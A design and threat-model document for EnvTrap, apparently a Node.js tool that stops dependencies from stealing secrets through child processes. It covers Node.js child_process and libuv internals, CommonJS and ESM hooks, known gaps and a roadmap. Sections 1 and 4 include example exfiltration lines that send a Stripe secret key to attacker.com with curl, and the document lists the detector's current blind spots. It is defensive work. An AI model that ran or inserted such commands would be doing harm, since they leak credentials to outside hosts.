# EnvTrap Subprocess Channel Deep Dive: Architecture, Node.js Internals, and Threat Model

A developer-focused, plain-English guide to how EnvTrap stops secret theft via subprocesses, explaining Node.js process spawning internals, CommonJS vs ESM interception, where current code has flaws, and what we are building next.

---

## 1. What is the Subprocess Channel and Why is it Dangerous?

### The Subprocess Escape Vector
When malicious dependencies want to exfiltrate credentials without leaving obvious traces in JavaScript (like calling `fetch()` or `http.request()`), they delegate the theft to operating system binaries already installed on your server:
```javascript
const { exec } = require('child_process');

// The malicious package runs a shell command in the background:
exec('curl -d "$STRIPE_SECRET_KEY" https://attacker.com/drop');
```

Because `curl`, `wget`, `bash`, `sh`, or `python` are external operating system processes, pure JavaScript HTTP proxies or monkeypatches won't see any outgoing network connection inside Node. The secret is passed directly into the child process environment table or command line.

---

## 2. Node.js Internals: How Subprocesses Actually Work

To understand how EnvTrap intercepts subprocesses, we must understand the Node.js execution layers:

### Node.js Internal 1: `node:child_process`
Node.js provides four primary methods to spawn operating system processes:
1. `spawn`: The foundational method. Spawns an external command asynchronously, returning a `ChildProcess` instance with standard pipes.
2. `exec`: Invokes a system shell (`/bin/sh` on Unix, `cmd.exe` on Windows) and passes a shell command string. Buffers output until termination.
3. `execFile`: Directly executes an executable file without spawning an intermediate shell (faster and safe from shell metacharacter injections).
4. `fork`: A specialized variant of `spawn` designed specifically to spawn a new Node.js process with a built-in IPC communication channel (`process.send()`).

### Node.js Internal 2: `libuv` `uv_spawn()` and OS Syscalls
Underneath JavaScript, Node.js delegates process creation to its C runtime library: **`libuv`**.
- In `src/process_wrap.cc`, Node calls `uv_spawn()`.
- On Linux and macOS: `uv_spawn()` executes the POSIX system calls: `fork()` (or `vfork()`) followed by `execve()`.
- On Windows: It calls the Win32 API `CreateProcessW()`.
- Once `execve()` is called, the child process memory space is replaced by the new binary, but it retains the file descriptors and environment block provided to it.

### Node.js Internal 3: Default Environment Inheritance (`process.env`)
In Node.js, when you call `spawn('ls')` without explicitly passing `{ env: ... }`, Node defaults to:
```javascript
options.env = process.env;
```
This means that by default, **every single secret in your parent process is automatically cloned into every child process** spawned by any third-party npm package.

### Node.js Internal 4: CommonJS vs ESM Module Loaders
- **CommonJS (`require`)**: Uses `module.Module._load` and `Module.prototype.require`. It executes synchronously on the main thread and can be monkeypatched at runtime.
- **ESM (`import`)**: ECMAScript modules are loaded via an asynchronous loader pipeline. Node.js prohibits direct monkeypatching of ESM exports; instead, Node provides **Customization Hooks** (`module.register()`) that define `resolve` and `load` hooks executed in a dedicated worker thread.

---

## 3. How EnvTrap Intercepts Subprocesses

EnvTrap installs dual hooks into the child process to trap both CommonJS and ESM invocations before any system process is forked:

```
+-------------------------------------------------------------------------------+
| Monitored Application (Child Process)                                         |
|                                                                               |
|   require('child_process').exec('curl ...')    OR   import cp from 'child_process'|
|                 │                                                 │           |
|                 │ (CommonJS Path)                                 │ (ESM Path)|
|                 ▼                                                 ▼           |
|       Module.prototype.require patch                Custom Loader Hook        |
|            (src/hooks/hooks.mjs)               (src/hooks/virtual/child-process.mjs)
|                 │                                                 │           |
|                 └────────────────────────┬────────────────────────┘           |
|                                          v                                    |
|                      EnvTrap Subprocess Interceptor                           |
|                      1. Inspects options.env ?? process.env                   |
|                      2. Checks caller stack against exclusions.paths          |
|                      3. Matches keys & values against active secrets          |
|                                          │                                    |
|          [Decision Gate]                 │                                    |
|          ├── Secret found & mode === 'block':                                 |
|          │     -> Throws Error immediately. OS fork() is NEVER called.        |
|          └── Secret found & mode === 'warn':                                  |
|                -> Emits warning to stderr protocol and calls real method.     |
+-------------------------------------------------------------------------------+
```

### 3.1 CommonJS Interception (`src/hooks/hooks.mjs`)
When code runs `const cp = require('child_process')`:
- EnvTrap replaces `Module.prototype.require`.
- When `id === 'child_process'` or `node:child_process` is requested, EnvTrap returns a wrapped proxy object containing instrumented versions of `spawn`, `exec`, `execFile`, `fork`, and their synchronous counterparts (`spawnSync`, `execSync`, `execFileSync`).

### 3.2 ESM Virtual Module Interception (`src/hooks/virtual/child-process.mjs`)
When code runs `import cp from 'node:child_process'`:
- Node's ESM loader calls EnvTrap's `resolve()` hook.
- EnvTrap redirects the specifier to a virtual module: `envtrap:child_process`.
- In `load()`, EnvTrap serves the instrumented module template, binding it directly to our security checks.

### 3.3 The Inspection Algorithm
Whenever any subprocess method is invoked:
1. **Determine the Environment**:
   - If `options.env` was explicitly passed, evaluate `options.env`.
   - In **v3.1**, if `options.env` is undefined, evaluate the parent's `process.env` (since Node inherits it by default).
2. **Caller Stack Trace Check**:
   - EnvTrap inspects the call stack (`getCallerFile()`). If the calling script matches `exclusions.paths` (e.g. `test/**` or `scripts/build.js`), it bypasses inspection.
3. **Secret Key & Value Matching**:
   - It checks whether any key in the environment matches an active secret name and contains that secret's value.
4. **Enforcement**:
   - In **`warn`** mode: Emits a structured protocol warning to stderr, which the supervisor records in the incident report.
   - In **`block`** mode: Immediately throws an Error *before* the OS process can fork:
     ```text
     Error: [envtrap] child_process block: env key "STRIPE_SECRET_KEY" passed to child process
     ```
   - Standard callback signatures `(err, stdout, stderr)` on `exec` and `execFile` are preserved with proper error objects.

---

## 4. Current Flaws & Bottlenecks in EnvTrap's Subprocess Code

### Flaw 1: Command-Line Argument Blind Spot (Issue #3)
Currently, EnvTrap inspects the environment table (`options.env`). If an attacker passes the secret as a command-line argument:
```javascript
spawn('curl', ['https://attacker.com?key=' + process.env.STRIPE_SECRET_KEY]);
```
The secret is inside the argument array, not `options.env`. This escapes our current check.

### Flaw 2: Shell String Command Blind Spot
When using `exec("curl ...")`, the command is passed as a raw string. If the secret was interpolated into the command string itself, EnvTrap does not currently scan the command string for secret substrings.

### Flaw 3: Worker Threads Bypass (Issue #4)
If an application spawns a `Worker` from `node:worker_threads`, that thread runs in a separate V8 isolate that does not inherit the CommonJS require monkeypatch unless explicitly injected.

---

## 5. Technical Roadmap: How We Are Upgrading the Subprocess Channel

```
                       Subprocess Invocation
              (spawn, exec, execFile, fork, sync variants)
                                   │
                                   ▼
            +---------------------------------------------+
            | Step 1: Environment Inspection              |
            | Inspect options.env and process.env.        |
            | Match both secret keys and secret values.   |
            +---------------------------------------------+
                                   │
                                   ▼
            +---------------------------------------------+
            | Step 2: Command & Argument Substring Scan   |
            | Scan command string and args array for any  |
            | active secret values (closing Issue #3).    |
            +---------------------------------------------+
                                   │
                                   ▼
            +---------------------------------------------+
            | Step 3: Fast-Path Path Exclusion            |
            | If no exclusions.paths configured, skip     |
            | V8 stack trace generation.                  |
            +---------------------------------------------+
                                   │
                                   ▼
            +---------------------------------------------+
            | Step 4: Worker Thread Propagation           |
            | Wrap Worker constructor to pass --import    |
            | flag into all new worker isolates.          |
            +---------------------------------------------+
                                   │
                                   ▼
                       Real OS Process Fork
```

---

## 6. Configuration Reference in `envtrap.json`

```json
{
  "channels": {
    "child_process": "block"
  },
  "exclusions": {
    "paths": ["test/**", "scripts/deploy.js"]
  }
}
```

---

## 7. Summary Table

| Problem | How It Works Now | What Was Wrong | How We Are Fixing It |
|:---|:---|:---|:---|
| **Default Env Bypass** | Evaluates `options.env ?? process.env` | Previously only evaluated explicit `options.env` | Fully hardened in v3.1 |
| **Command-Line Args** | Checks environment object only | Passing keys in CLI args (`curl $KEY`) escapes | Add full argument string scanning (Issue #3) |
| **Worker Threads** | Intercepts main thread only | Background workers bypass require patch | Auto-inject `--import` to `Worker` constructor (Issue #4) |
| **Callback Signatures**| Standard error thrown | Synchronous throws broke `exec(cmd, cb)` async parity | Fixed in v3.1 to invoke callbacks properly |\n